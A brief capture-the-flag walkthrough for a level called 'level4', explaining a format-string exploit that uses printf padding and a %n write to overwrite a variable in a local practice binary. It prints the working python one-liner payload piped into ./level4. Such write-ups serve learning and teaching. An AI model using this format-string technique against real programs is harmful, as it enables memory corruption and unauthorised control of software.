# Walkthrough

## Disassembling the executable

see source.c

## Exploit

The principle was the same as level3 (see walkthrough level3), although the value of m had to be greater than the buffer size.

To reach that value, we used printf padding as such:

```
python -c "print('\x10\x98\x04\x08 %16930016p %p %p %p %p %p %p %p %p %p %p %n') " | ./level4
```
